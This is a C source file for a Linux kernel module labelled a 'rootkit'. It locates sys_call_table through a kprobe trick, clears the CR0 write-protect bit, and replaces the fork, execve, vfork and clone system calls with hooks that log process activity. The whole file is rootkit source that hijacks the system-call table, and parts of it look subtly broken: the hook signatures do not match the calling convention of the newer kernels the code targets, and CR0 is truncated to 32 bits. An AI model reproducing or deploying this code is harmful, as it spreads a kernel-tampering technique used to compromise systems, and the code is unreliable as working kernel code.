#include "asm/syscall.h"
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/file.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>

#include "arch.h"

static unsigned long *__sys_call_table;

typedef long (*clone_fn_t)(unsigned long, unsigned long, void __user *,
			   void __user *);
typedef long (*fork_fn_t)(void);
typedef long (*execve_fn_t)(const char __user *, const char __user *const *,
			    const char __user *const *);

static fork_fn_t orig_sys_fork;
static execve_fn_t orig_sys_execve;
static fork_fn_t orig_sys_vfork;
static clone_fn_t orig_sys_clone;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t my_kallsyms_lookup_name;

static char symbol[KSYM_NAME_LEN] = "kallsyms_lookup_name";
module_param_string(symbol, symbol, KSYM_NAME_LEN, 0644);

static struct kprobe kp = {
	.symbol_name = symbol,
};

unsigned long lookup_name(const char *name);
unsigned long lookup_name(const char *name)
{
	int ret = 0;
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_info("register_kprobe error, %d:[%p]\n", ret, kp.addr);
		return 0;
	}
	unregister_kprobe(&kp);
	my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	return my_kallsyms_lookup_name(name);
}
#else
unsigned long lookup_name(const char *name);
unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

static unsigned int cr0 = 0;
static unsigned int clear_and_return_cr0(void);
static unsigned int clear_and_return_cr0(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	asm volatile("movq %%cr0, %%rax" : "=a"(cr0));
	ret = cr0;
	cr0 &= 0xfffeffff;
	asm volatile("movq %%rax, %%cr0" ::"a"(cr0));
	return ret;
}

static void setback_cr0(unsigned int val);
static void setback_cr0(unsigned int val)
{
	asm volatile("movq %%rax, %%cr0" ::"a"(val));
}

static asmlinkage long fork_hook(void);
static asmlinkage long fork_hook(void)
{
	long ret = orig_sys_fork();
	struct task_struct *parent = current;
	struct task_struct *child = NULL;
	pid_t child_pid = ret;

	if (ret < 0) {
		pr_info("rootkit: fork failed: %ld\n", ret);
		return ret;
	}

	if (ret > 0) {
		child_pid = ret;
		child = pid_task(find_get_pid(child_pid), PIDTYPE_PID);
		pr_info("rootkit: [FORK] Parent: pid=%d, comm=%s, ppid=%d | Child: pid=%d, comm=%s\n",
			parent->pid, parent->comm,
			parent->parent ? parent->parent->pid : 0, child_pid,
			child ? child->comm : "<not found>");
	} else {
		pr_info("rootkit: [FORK] Child: pid=%d, comm=%s, ppid=%d\n",
			parent->pid, parent->comm,
			parent->parent ? parent->parent->pid : 0);
	}

	return ret;
}

static asmlinkage long execve_hook(const char __user *filename,
				   const char __user *const __user *argv,
				   const char __user *const __user *envp);
static asmlinkage long execve_hook(const char __user *filename,
				   const char __user *const __user *argv,
				   const char __user *const __user *envp)
{
	char fname[256] = { 0 };
	long ret;

	if (filename) {
		strncpy_from_user(fname, filename, sizeof(fname) - 1);
	}

	ret = orig_sys_execve(filename, argv, envp);

	if (ret == 0) {
		pr_info("rootkit: [EXECVE] Success: pid=%d, comm=%s, file=%s\n",
			current->pid, current->comm, fname);
	} else {
		pr_info("rootkit: [EXECVE] Failed: pid=%d, comm=%s, file=%s, err=%ld\n",
			current->pid, current->comm, fname, ret);
	}

	return ret;
}

static asmlinkage long vfork_hook(void);
static asmlinkage long vfork_hook(void)
{
	long ret = orig_sys_vfork();
	struct task_struct *parent = current;
	struct task_struct *child = NULL;
	pid_t child_pid = ret;

	if (ret < 0) {
		pr_info("rootkit: vfork failed: %ld\n", ret);
		return ret;
	}

	if (ret > 0) {
		child_pid = ret;
		child = pid_task(find_get_pid(child_pid), PIDTYPE_PID);
		pr_info("rootkit: [VFORK] Parent: pid=%d, comm=%s, ppid=%d | Child: pid=%d, comm=%s\n",
			parent->pid, parent->comm,
			parent->parent ? parent->parent->pid : 0, child_pid,
			child ? child->comm : "<not found>");
	} else {
		pr_info("rootkit: [VFORK] Child: pid=%d, comm=%s, ppid=%d\n",
			parent->pid, parent->comm,
			parent->parent ? parent->parent->pid : 0);
	}

	return ret;
}

static asmlinkage long clone_hook(unsigned long clone_flags,
				  unsigned long newsp, void __user *parent_tid,
				  void __user *child_tid);
static asmlinkage long clone_hook(unsigned long clone_flags,
				  unsigned long newsp, void __user *parent_tid,
				  void __user *child_tid)
{
	long ret = orig_sys_clone(clone_flags, newsp, parent_tid, child_tid);

	if (ret >= 0) {
		pr_info("rootkit: [CLONE] pid=%d, flags=0x%lx, ret=%d\n",
			current->pid, clone_flags, ret);
	}

	return ret;
}

static int __init fork_exec_hook_init(void)
{
	__sys_call_table = (unsigned long *)lookup_name("sys_call_table");
	if (!__sys_call_table) {
		pr_err("rootkit: __sys_call_table error\n");
		return -EINVAL;
	}

	pr_info("rootkit: __sys_call_table: %lx\n",
		(unsigned long)__sys_call_table);

	orig_sys_fork = (fork_fn_t)__sys_call_table[__NR_fork];
	orig_sys_execve = (execve_fn_t)__sys_call_table[__NR_execve];
	orig_sys_vfork = (fork_fn_t)__sys_call_table[__NR_vfork];
	orig_sys_clone = (clone_fn_t)__sys_call_table[__NR_clone];

	pr_info("rootkit: orig_sys_fork: %lx, orig_sys_execve: %lx, orig_sys_vfork: %lx, orig_sys_clone: %lx\n",
		(unsigned long)orig_sys_fork, (unsigned long)orig_sys_execve,
		(unsigned long)orig_sys_vfork, (unsigned long)orig_sys_clone);

	cr0 = clear_and_return_cr0();
	__sys_call_table[__NR_fork] = (unsigned long)fork_hook;
	__sys_call_table[__NR_execve] = (unsigned long)execve_hook;
	__sys_call_table[__NR_vfork] = (unsigned long)vfork_hook;
	__sys_call_table[__NR_clone] = (unsigned long)clone_hook;
	setback_cr0(cr0);

	pr_info("rootkit: fork_hook: %lx, execve_hook: %lx, vfork_hook: %lx, clone_hook: %lx\n",
		(unsigned long)fork_hook, (unsigned long)execve_hook,
		(unsigned long)vfork_hook, (unsigned long)clone_hook);

	pr_info("rootkit: fork_exec_hook loaded\n");
	return 0;
}

static void __exit fork_exec_hook_exit(void)
{
	cr0 = clear_and_return_cr0();
	__sys_call_table[__NR_fork] = (unsigned long)orig_sys_fork;
	__sys_call_table[__NR_execve] = (unsigned long)orig_sys_execve;
	__sys_call_table[__NR_vfork] = (unsigned long)orig_sys_vfork;
	__sys_call_table[__NR_clone] = (unsigned long)orig_sys_clone;
	setback_cr0(cr0);
	pr_info("rootkit: fork_exec_hook unloaded\n");
}

module_init(fork_exec_hook_init);
module_exit(fork_exec_hook_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("black");
MODULE_VERSION("1.00");
